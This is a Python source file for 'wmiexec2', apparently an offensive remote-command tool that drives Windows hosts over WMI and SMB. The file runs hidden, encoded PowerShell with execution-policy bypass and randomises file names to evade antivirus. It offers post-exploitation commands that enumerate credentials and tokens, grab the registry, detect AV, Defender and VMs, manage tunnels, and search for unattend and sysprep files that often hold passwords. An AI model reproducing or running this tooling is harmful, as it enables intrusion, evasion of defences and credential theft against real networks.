from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import time
import logging
import ntpath
from base64 import b64encode
from six import PY2

from modules.av.av_procs import av_procs

from modules.av.evasion import generate_unique_signature
from modules.av.evasion import generate_temp_permutation

from modules.av.opsec import security_tools
from modules.av.opsec import vm
from modules.av.opsec import log_grab
from modules.av.msft_defender import defender_checks

from modules.system_info.sysinfo import basic_system_info
from modules.system_info.sysinfo import get_mounts

from modules.help.help import print_module_help

from modules.survey.survey import survey

from modules.local_commands.local_commands import local_get
from modules.local_commands.local_commands import local_put
from modules.local_commands.local_commands import local_cd

from modules.post_ex.post_exploitation import enum_credentials
from modules.post_ex.post_exploitation import tokens
from modules.post_ex.post_exploitation import regrip

from modules.tunnels.tunnel_mgr import add_tun
from modules.tunnels.tunnel_mgr import show_tun
from modules.tunnels.tunnel_mgr import del_tun



def random_sig():
    return generate_unique_signature()


OUTPUT_FILENAME = random_sig()
CODEC = sys.stdout.encoding


def temp_perm(option):
    return generate_temp_permutation(option)


class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + temp_perm("dir") + '\\' + OUTPUT_FILENAME
        print(f"[*] Output Filename: {self.__output}")
        self.__outputBuffer = str('')
        self.__shell = temp_perm("cmd") + ' /Q /c '
        self.__shell_type = shell_type
        # call function here that will generate random encoding schemes here, in addition to shuffling order of flags where we can
        # -NOL --> No Logo
        # -NOP --> No execution profile
        # -STA --> Single Threaded Apartment
        # -NONI --> Non interactive
        # -W --> Window Style needs Hidden After
        # -Exec --> Needs bypass after
        # -Enc --> Encoded command
        self.__pwsh = temp_perm("power") + ' -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__silentCommand = silentCommand
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.intro = '[*] **Launching wmiexec2**\n[*] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

        # If the user wants to just execute a command without cmd.exe, set raw command and set no output
        if self.__silentCommand is True:
            self.__shell = ''

    @property
    def cwd(self): return self.__pwd
    @cwd.setter
    def cwd(self, v): self.__pwd = v

    @property
    def share(self): return self.__share

    @property
    def smb(self): return self.__transferClient

    @property
    def shell_type(self): return self.__shell_type

    @property
    def out(self) -> str:
        return self.__outputBuffer

    def out_clear(self) -> None:
        self.__outputBuffer = ''

    def out_set(self, s: str) -> None:
        self.__outputBuffer = s


    def format_print_buff(self):
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        return print_module_help()
    

    def do_survey(self, s):
        survey(self, s)

    def do_loggrab(self, s):
        return log_grab(self, s)

    def do_mounts(self, s):
        return get_mounts(self, s)

    def do_sysinfo(self, s):
        return basic_system_info(self, s)
        

    def do_lcd(self, s):
        return local_cd(self, s)

    # add md5 before after 
    # add a progress bar. see how ivan does his 
    # import tqdm

    def do_lget(self, src_path):
        return local_get(self, src_path)


    def do_addtun(self, s):
        return add_tun(self, s)

    def do_showtun(self, s):
        return show_tun(self, s)

    def do_deltun(self, s):
        return del_tun(self, s)

    def do_ls(self, s):
        # see if user specified a dir or not
        if len(s) == 0:
            try:
                self.execute_remote('dir /A /N /O:D .')
                self.format_print_buff()
            except Exception as e:
                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
        else:
            path = s.split(" ")[0]
            try:
                self.execute_remote('dir /A /N /O:D "%s"' % path)
                self.format_print_buff()
            except Exception as e:
                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    # add progress bar, see how ivan does his
    # add md5 before after 
    def do_lput(self, s):
        return local_put(self, s)
        

    # fix this dumpster fire
    def do_av(self, s):
        try:
            #self.execute_remote('wmic process get name')
            self.execute_remote('tasklist /svc | findstr /v ctfmon.exe')
            for i in av_procs:
                if i in self.__outputBuffer.strip('\r\n'):
                    print(i)
            self.__outputBuffer = ''
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_defender(self, s):
        return defender_checks(self, s)


    # fix this output
    def do_tokens(self, s):
        return tokens(self, s)

    def do_creds(self, s):
        return enum_credentials(self, s)

    def do_securitytools(self, s):
        return security_tools(self, s)

    def do_vmcheck(self, s):
        return vm(self, s)
        

    def do_cat(self, s):
        try:
            self.execute_remote('type ' + s)
            self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    # an array, ever heard of one...
    def do_unattend(self, s):
        one = r"C:\unattend.txt"
        two = r"C:\unattend.inf"
        three = r"C:\Windows\sysprep.inf"
        four = r"C:\Windows\sysprep\sysprep.xml"
        five = r"C:\Windows\sysprep\sysprep.inf"
        six = r"C:\Windows\Panther\Unattended.xml"
        seven = r"C:\Windows\Panther\Unattend.xml"
        eight = r"C:\Windows\Panther\Unattend\Unattend.xml"
        nine = r"C:\Windows\Panther\Unattend\Unattended.xml"
        ten = r"C:\Windows\System32\Sysprep\unattend.xml"
        eleven = r"C:\Windows\System32\Sysprep\unattended.xml"

        try:
            logging.info("Looking for: %s, %s" % (one, two))
            self.execute_remote('dir C:\ | findstr /i "unattend.txt || unattend.inf"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

        try:
            logging.info("Looking for: %s" % (three))
            self.execute_remote("dir C:\Windows | findstr /i 'sysprep.inf'")
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

        try:
            logging.info("Looking for: %s, %s" % (four, five))
            self.execute_remote(r'dir C:\Windows\sysprep | findstr /i "sysprep.inf || sysprep.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)
        try:
            logging.info("Looking for: %s, %s" % (six, seven))
            self.execute_remote(r'dir C:\Windows\Panther | findstr /i "Unattended.xml || Unattend.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

        try:
            logging.info("Looking for: %s, %s" % (eight, nine))
            self.execute_remote(r'dir C:\Windows\Panther\Unattend | findstr /i "Unattended.xml || Unattend.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

        try:
            logging.info("Looking for: %s, %s" % (ten, eleven))
            self.execute_remote('dir C:\Windows\System32\Sysprep | findstr /i "unattend.xml || unattended.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

    def do_regrip(self, s):
        return regrip(self, s)


    def do_exit(self, s):
        return True
    

    def emptyline(self):
        return False


    def do_cd(self, s):
        raw = (s or '').strip()
        # remove surrounding quotes only
        if len(raw) >= 2 and raw[0] == raw[-1] == '"':
            raw = raw[1:-1]

        # resolve target path relative to current self.__pwd
        if raw in ('', '.'):
            target = self.__pwd
        elif raw in ('\\', '/'):
            drive, _ = ntpath.splitdrive(self.__pwd)
            target = drive + '\\'
        else:
            drv, _ = ntpath.splitdrive(raw)
            if drv:
                target = ntpath.normpath(raw)                    # absolute like C:\Foo
            elif raw.startswith('\\'):
                cur_drive, _ = ntpath.splitdrive(self.__pwd)     # \Windows → C:\Windows
                target = ntpath.normpath(cur_drive + raw)
            else:
                target = ntpath.normpath(ntpath.join(self.__pwd, raw))

        # try change dir remotely (single cmd invocation)
        self.execute_remote('cd /d "{}"'.format(target))

        if len(self.__outputBuffer.strip('\r\n')) > 0:
            # any error text printed by cmd, show and keep current pwd
            self.format_print_buff()
            return

        self.__pwd = target
        self.execute_remote('cd ')
        self.__pwd = self.__outputBuffer.strip('\r\n')
        self.prompt = (self.__pwd + '> ')
        if self.__shell_type == 'powershell':
            self.prompt = '\U0001F47B' + ' ' + 'PS ' + self.prompt + ' '
        self.__outputBuffer = ''


    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        start = time.time()
        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                es = str(e)
                if 'STATUS_SHARING_VIOLATION' in es:
                    time.sleep(1)
                    continue
                elif 'Broken' in es:
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
                elif ('STATUS_OBJECT_NAME_NOT_FOUND' in es or
                    'STATUS_OBJECT_PATH_NOT_FOUND' in es or
                    'The system cannot find the file specified' in es):
                    # Command produced no output file (failed early). Stop waiting.
                    logging.debug('Output file not found; command likely failed before redirection.')
                    self.__outputBuffer = ''
                    break
                # optional: global timeout to avoid rare infinite loops
                if time.time() - start > 300:
                    logging.warning('Timeout waiting for remote output.')
                    break
                time.sleep(0.5)

        try:
            self.__transferClient.deleteFile(self.__share, self.__output)
        except Exception:
            pass


    def execute_remote(self, data, shell_type='cmd'):
        if shell_type == 'powershell':
            data = '$ProgressPreference="SilentlyContinue";' + data
            data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()

        command = self.__shell + data

        if self.__noOutput is False:
            # can you obfuscate this...
            command += ' 1> ' + '\\\\localhost\\%s' % self.__share + self.__output + ' 2>&1'
        if PY2:
            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
        else:
            self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        print(self.__outputBuffer)
        self.__outputBuffer = ''